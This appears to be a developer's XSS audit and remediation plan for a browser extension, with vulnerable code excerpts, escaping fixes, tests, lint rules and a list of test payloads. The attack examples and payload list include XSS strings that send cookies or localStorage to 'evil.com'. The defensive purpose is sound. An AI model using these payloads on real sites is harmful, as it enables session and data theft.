# XSS Vulnerability Audit & Remediation Plan

**Date:** 2025-11-01
**Branch:** `security`
**Priority:** P0 - CRITICAL
**Status:** 🚧 In Progress

---

## 🎯 Objective

Eliminate all XSS (Cross-Site Scripting) vulnerabilities in PromptBlocker by:
1. Auditing all `innerHTML` assignments
2. Identifying user-controlled data flows
3. Applying proper HTML escaping
4. Creating safe rendering patterns
5. Adding automated tests to prevent regressions

---

## 📊 Audit Results

### Summary
- **Total innerHTML assignments found:** 52 instances
- **Files affected:** 11 TypeScript files in `src/popup/components/`
- **Risk level:** 🔴 HIGH - User-controlled data rendered without escaping
- **Attack vectors:** Profile names, emails, custom rule patterns, API key names

### Vulnerable Files (Priority Order)

#### 🔴 CRITICAL (User-controlled data, directly exploitable)

**1. `src/popup/components/profileRenderer.ts`**
- **Lines:** 22, 27
- **Risk:** HIGH - Renders profile names/emails directly
- **User input:** Profile name, real name, alias name, emails
- **Attack example:** Profile name: `<img src=x onerror=alert('XSS')>`
```typescript
// Line 27 - VULNERABLE
profileList.innerHTML = profiles.map(profile => `
  <div class="profile-card">
    <h3>${profile.profileName}</h3>  // ⚠️ NO ESCAPING
    <p>${profile.real.name}</p>       // ⚠️ NO ESCAPING
    <p>${profile.alias.email}</p>     // ⚠️ NO ESCAPING
  </div>
`).join('');
```

**2. `src/popup/components/profileModal.ts`**
- **Lines:** 422, 446, 471, 560, 569, 849, 850, 853
- **Risk:** HIGH - Profile editing UI, field values rendered
- **User input:** All profile fields (name, email, phone, address, company)
- **Attack example:** Real name: `<script>steal(localStorage)</script>`
```typescript
// Line 471 - VULNERABLE
header.innerHTML = `
  <h3>Edit ${fieldType}</h3>
  <p>Real: ${realValue}</p>    // ⚠️ NO ESCAPING
  <p>Alias: ${aliasValue}</p>  // ⚠️ NO ESCAPING
`;
```

**3. `src/popup/components/customRulesUI.ts`**
- **Lines:** 48, 238, 383, 511, 517, 536, 541, 545, 734, 800, 807, 827, 829, 831, 885
- **Risk:** HIGH - Custom regex patterns and test results
- **User input:** Rule name, pattern, replacement text, test input/output
- **Attack example:** Rule name: `<img src=x onerror=fetch('evil.com?data='+document.cookie)>`
```typescript
// Line 238 - VULNERABLE
return div.innerHTML = rules.map(rule => `
  <div class="rule-card">
    <h4>${rule.name}</h4>              // ⚠️ NO ESCAPING
    <code>${rule.pattern}</code>       // ⚠️ NO ESCAPING
    <p>${rule.replacement}</p>         // ⚠️ NO ESCAPING
  </div>
`).join('');
```

**4. `src/popup/components/apiKeyVault.ts`**
- **Lines:** 33, 309
- **Risk:** MEDIUM-HIGH - API key names and metadata
- **User input:** Key name (optional, user-provided)
- **Attack example:** Key name: `<iframe src=evil.com></iframe>`
```typescript
// Line 309 - VULNERABLE
return div.innerHTML = keys.map(key => `
  <div class="key-card">
    <h4>${key.name || 'Unnamed Key'}</h4>  // ⚠️ NO ESCAPING
    <p>${key.format}</p>
  </div>
`).join('');
```

**5. `src/popup/components/apiKeyModal.ts`**
- **Lines:** 401, 440
- **Risk:** MEDIUM - Detected API keys display
- **User input:** API key format, detection results
```typescript
// Line 401 - VULNERABLE
detectedKeysContainer.innerHTML = keys.map((key, index) => `
  <div class="detected-key">
    <span>${key.format}</span>  // ⚠️ Might be safe (enum), but verify
  </div>
`).join('');
```

#### 🟡 MEDIUM (System-generated data, but should still escape)

**6. `src/popup/components/activityLog.ts`**
- **Lines:** 40, 45
- **Risk:** MEDIUM - Activity log entries (might contain user data)
- **User input:** Service names, timestamps, PII types
```typescript
// Line 45 - NEEDS REVIEW
debugConsole.innerHTML = activityLog.map(entry => `
  <div class="log-entry">
    <span>${entry.service}</span>    // System enum - likely safe
    <span>${entry.piiType}</span>    // System enum - likely safe
    <span>${entry.timestamp}</span>  // System-generated - safe
  </div>
`).join('\n');
```

**7. `src/popup/components/statsRenderer.ts`**
- **Lines:** 87, 97, 153, 160, 226, 233, 259, 281
- **Risk:** LOW-MEDIUM - Stats display (mostly numbers, but includes profile names)
- **User input:** Profile names in stats
```typescript
// Line 97 - NEEDS ESCAPING
container.innerHTML = enabledProfiles.map(profile => `
  <div class="profile-stat">
    <h4>${profile.profileName}</h4>  // ⚠️ NO ESCAPING
    <p>${profile.metadata.usageStats.totalSubstitutions} uses</p>
  </div>
`).join('');
```

**8. `src/popup/components/featuresTab.ts`**
- **Lines:** 80, 105, 208
- **Risk:** LOW - Feature descriptions (static content from system)
- **User input:** None (system-defined feature data)
```typescript
// Line 105 - LIKELY SAFE (static data)
card.innerHTML = `
  <h3>${feature.title}</h3>          // System-defined - safe
  <p>${feature.description}</p>      // System-defined - safe
`;
```

#### 🟢 LOW (Likely safe, but audit for completeness)

**9. `src/popup/utils/dom.ts`**
- **Lines:** 7, 12, 16, 19, 31, 46, 47
- **Risk:** LOW - Utility functions (escapeHtml exists here!)
- **Note:** This file CONTAINS the fix (`escapeHtml()`), not the vulnerability
```typescript
// Line 9-12 - THIS IS THE SOLUTION ✅
export function escapeHtml(text: string): string {
  const div = document.createElement('div');
  div.textContent = text;  // Automatic HTML encoding
  return div.innerHTML;
}
```

**10. `src/popup/components/utils.ts`**
- **Lines:** 16
- **Risk:** LOW - Comment line, not actual usage

**11. `src/popup/components/minimalMode.ts`**
- **Lines:** (localStorage usage, separate issue)
- **Risk:** N/A for XSS, but has localStorage vulnerability

---

## 🛡️ Remediation Strategy

### Phase 1: Create Safe Rendering Helpers

**1. Enhance `src/popup/utils/dom.ts`**
```typescript
/**
 * Safely render HTML template with escaped user data
 * @param template - Template string with ${} placeholders
 * @param data - Object with values to escape
 * @returns Safe HTML string
 */
export function safeHTML(
  template: string,
  data: Record<string, string | number | boolean>
): string {
  let result = template;
  for (const [key, value] of Object.entries(data)) {
    const escaped = typeof value === 'string' ? escapeHtml(value) : String(value);
    result = result.replace(new RegExp(`\\$\\{${key}\\}`, 'g'), escaped);
  }
  return result;
}

/**
 * Safely render array of items with escaping
 */
export function safeMap<T>(
  items: T[],
  renderFn: (item: T) => string,
  escapeFields: (keyof T)[]
): string {
  return items.map(item => {
    const escaped = { ...item } as any;
    escapeFields.forEach(field => {
      if (typeof escaped[field] === 'string') {
        escaped[field] = escapeHtml(escaped[field]);
      }
    });
    return renderFn(escaped);
  }).join('');
}
```

### Phase 2: Fix Each Component

**Priority 1: profileRenderer.ts**
```typescript
// BEFORE (vulnerable):
profileList.innerHTML = profiles.map(profile => `
  <div class="profile-card">
    <h3>${profile.profileName}</h3>
  </div>
`).join('');

// AFTER (safe):
import { escapeHtml } from '../utils/dom';

profileList.innerHTML = profiles.map(profile => `
  <div class="profile-card">
    <h3>${escapeHtml(profile.profileName)}</h3>
    <p>Real: ${escapeHtml(profile.real.name || '')}</p>
    <p>Alias: ${escapeHtml(profile.alias.name || '')}</p>
  </div>
`).join('');
```

**Priority 2: profileModal.ts**
```typescript
// BEFORE (vulnerable):
header.innerHTML = `<h3>Edit ${fieldType}</h3>`;

// AFTER (safe):
import { escapeHtml } from '../utils/dom';

header.innerHTML = `<h3>Edit ${escapeHtml(fieldType)}</h3>`;
```

**Priority 3: customRulesUI.ts**
```typescript
// BEFORE (vulnerable):
rulesList.innerHTML = rules.map(rule => `
  <div class="rule-card">
    <h4>${rule.name}</h4>
    <code>${rule.pattern}</code>
  </div>
`).join('');

// AFTER (safe):
import { escapeHtml } from '../utils/dom';

rulesList.innerHTML = rules.map(rule => `
  <div class="rule-card">
    <h4>${escapeHtml(rule.name)}</h4>
    <code>${escapeHtml(rule.pattern)}</code>
    <p>${escapeHtml(rule.replacement)}</p>
  </div>
`).join('');
```

### Phase 3: Add XSS Prevention Tests

**Create `tests/xss-prevention.test.ts`:**
```typescript
import { escapeHtml, safeHTML } from '../src/popup/utils/dom';

describe('XSS Prevention', () => {
  describe('escapeHtml', () => {
    test('escapes <script> tags', () => {
      const malicious = '<script>alert("XSS")</script>';
      const escaped = escapeHtml(malicious);
      expect(escaped).toBe('&lt;script&gt;alert("XSS")&lt;/script&gt;');
      expect(escaped).not.toContain('<script>');
    });

    test('escapes <img> with onerror', () => {
      const malicious = '<img src=x onerror=alert("XSS")>';
      const escaped = escapeHtml(malicious);
      expect(escaped).not.toContain('onerror');
    });

    test('escapes <iframe> tags', () => {
      const malicious = '<iframe src="evil.com"></iframe>';
      const escaped = escapeHtml(malicious);
      expect(escaped).not.toContain('<iframe>');
    });

    test('escapes event handlers', () => {
      const malicious = '<div onclick="alert(1)">Click</div>';
      const escaped = escapeHtml(malicious);
      expect(escaped).not.toContain('onclick');
    });

    test('handles normal text safely', () => {
      const normal = 'John Smith';
      expect(escapeHtml(normal)).toBe('John Smith');
    });

    test('preserves special characters', () => {
      const text = 'Email: john@example.com (555) 123-4567';
      expect(escapeHtml(text)).toBe(text);
    });
  });

  describe('Profile Rendering XSS Prevention', () => {
    test('profile name with XSS attempt', () => {
      const profile = {
        profileName: '<script>alert("XSS")</script>',
        real: { name: 'John' },
        alias: { name: 'Alex' }
      };

      // Simulate rendering (safe version)
      const html = `<h3>${escapeHtml(profile.profileName)}</h3>`;

      expect(html).not.toContain('<script>');
      expect(html).toContain('&lt;script&gt;');
    });

    test('email with XSS attempt', () => {
      const email = 'test@example.com<img src=x onerror=alert(1)>';
      const html = `<p>${escapeHtml(email)}</p>`;

      expect(html).not.toContain('onerror');
    });
  });

  describe('Custom Rules XSS Prevention', () => {
    test('rule name with XSS', () => {
      const rule = {
        name: '<iframe src="evil.com"></iframe>',
        pattern: '\\d{3}-\\d{2}-\\d{4}',
        replacement: '[SSN]'
      };

      const html = `<h4>${escapeHtml(rule.name)}</h4>`;
      expect(html).not.toContain('<iframe>');
    });

    test('pattern with dangerous regex', () => {
      const pattern = '(a+)+$'; // ReDoS potential
      // Should validate pattern, not just escape
      expect(() => new RegExp(pattern)).not.toThrow();
    });
  });
});
```

### Phase 4: Add ESLint Rule

**Add to `.eslintrc.json`:**
```json
{
  "rules": {
    "no-restricted-properties": [
      "error",
      {
        "object": "*",
        "property": "innerHTML",
        "message": "Use escapeHtml() before setting innerHTML to prevent XSS. Import from src/popup/utils/dom.ts"
      }
    ]
  }
}
```

Or create custom rule in `.eslint-rules/no-unsafe-innerhtml.js`:
```javascript
module.exports = {
  meta: {
    type: 'problem',
    docs: {
      description: 'Disallow innerHTML without escapeHtml',
      category: 'Security',
      recommended: true
    }
  },
  create(context) {
    return {
      AssignmentExpression(node) {
        if (
          node.left.property &&
          node.left.property.name === 'innerHTML'
        ) {
          // Check if escapeHtml is used in the assignment
          const sourceCode = context.getSourceCode();
          const rightText = sourceCode.getText(node.right);

          if (!rightText.includes('escapeHtml(')) {
            context.report({
              node,
              message: 'innerHTML assignment must use escapeHtml() to prevent XSS'
            });
          }
        }
      }
    };
  }
};
```

---

## 📝 Implementation Checklist

### Week 1: Critical Fixes

#### Day 1: Setup & Helpers
- [ ] Create `tests/xss-prevention.test.ts`
- [ ] Enhance `src/popup/utils/dom.ts` with `safeHTML()` and `safeMap()`
- [ ] Add ESLint rule for innerHTML
- [ ] Run tests to ensure helpers work

#### Day 2: Fix High-Risk Components
- [ ] Fix `src/popup/components/profileRenderer.ts` (2 instances)
- [ ] Fix `src/popup/components/profileModal.ts` (8 instances)
- [ ] Test profile creation/editing with XSS payloads
- [ ] Verify no XSS in profile display

#### Day 3: Fix Medium-Risk Components
- [ ] Fix `src/popup/components/customRulesUI.ts` (15 instances)
- [ ] Fix `src/popup/components/apiKeyVault.ts` (2 instances)
- [ ] Fix `src/popup/components/apiKeyModal.ts` (2 instances)
- [ ] Test custom rules with malicious patterns

#### Day 4: Fix Low-Risk Components
- [ ] Fix `src/popup/components/activityLog.ts` (2 instances)
- [ ] Fix `src/popup/components/statsRenderer.ts` (8 instances)
- [ ] Review `src/popup/components/featuresTab.ts` (likely safe, but verify)

#### Day 5: Testing & Validation
- [ ] Run full XSS test suite
- [ ] Manual testing with XSS payloads:
  - Profile name: `<script>alert('XSS')</script>`
  - Email: `test@x.com<img src=x onerror=alert(1)>`
  - Rule name: `<iframe src="evil.com"></iframe>`
- [ ] Check browser console for errors
- [ ] ESLint passes with no innerHTML warnings

---

## 🧪 Test Payloads

Use these to verify XSS is prevented:

```javascript
// Profile Names
"<script>alert('XSS')</script>"
"<img src=x onerror=alert(document.cookie)>"
"<iframe src='evil.com'></iframe>"
"<svg onload=alert('XSS')>"
"<body onload=alert('XSS')>"

// Emails
"test@x.com<script>alert(1)</script>"
"admin@site.com'><script>steal()</script>"

// Custom Rule Patterns
"<img src=x onerror=fetch('evil.com?data='+localStorage)>"
".*<script>.*" // Should be escaped when displayed

// API Key Names
"My Key<iframe src='phishing.com'></iframe>"
```

---

## ✅ Success Criteria

- [ ] All 52 innerHTML assignments use escapeHtml()
- [ ] XSS test suite passes (20+ tests)
- [ ] Manual XSS payload testing passes
- [ ] ESLint rule enforces escapeHtml usage
- [ ] No console errors when rendering user data
- [ ] External security audit (optional but recommended)

---

## 📚 References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Chrome Extension Content Security Policy](https://developer.chrome.com/docs/extensions/mv3/manifest/content_security_policy/)
- [HTML Sanitization API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API)

---

**Last Updated:** 2025-11-01
**Next Review:** After all fixes implemented
